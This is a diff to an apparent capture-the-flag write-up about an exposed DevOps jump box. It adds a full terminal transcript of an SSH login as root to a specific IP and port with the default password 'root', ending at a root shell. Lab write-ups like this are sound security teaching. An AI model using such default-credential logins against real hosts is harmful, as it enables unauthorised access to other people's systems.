@@ -1745,20 +1745,42 @@ A misconfigured DevOps jump box used by a third-party contractor was left expose
 	
 	**Observation:**  
 	Port `34788` is open. Likely running SSH based on challenge hints.
-
-
-2. Exploitation
-
-### ✅ Step 2: Attempt SSH with Default Credentials
-
-**Command:**
-
-```bash
-ssh root@68.183.205.254 -p 34788
-```
-
-**Password Used:** `root`  
-**Result:** Successfully logged in as root.
+	
+2. Exploitation; Attempt SSH with Default Credentials
+	
+	```bash
+	┌──(mopsy㉿APHP)-[~/H4K-IT]
+	└─$ ssh root@68.183.205.254 -p 34788
+	The authenticity of host '[68.183.205.254]:34788 ([68.183.205.254]:34788)' can't be established.
+	ED25519 key fingerprint is SHA256:NW3cU6vByX2uazQ08iOOGPFsDMy/sQb3n+XoyqBwOsw.
+	This host key is known by the following other names/addresses:
+	    ~/.ssh/known_hosts:33: [hashed name]
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	Warning: Permanently added '[68.183.205.254]:34788' (ED25519) to the list of known hosts.
+	root@68.183.205.254's password:
+	Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.11.0-9-generic x86_64)
+	
+	 * Documentation:  https://help.ubuntu.com
+	 * Management:     https://landscape.canonical.com
+	 * Support:        https://ubuntu.com/pro
+	
+	This system has been minimized by removing packages and content that are
+	not required on a system that users do not log into.
+	
+	To restore this content, you can run the 'unminimize' command.
+	
+	The programs included with the Ubuntu system are free software;
+	the exact distribution terms for each program are described in the
+	individual files in /usr/share/doc/*/copyright.
+	
+	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+	applicable law.
+	
+	root@34421a342df6:~# 
+	```
+	
+	**Password Used:** `root`  
+	**Result:** Successfully logged in as root.
 
 ---
 
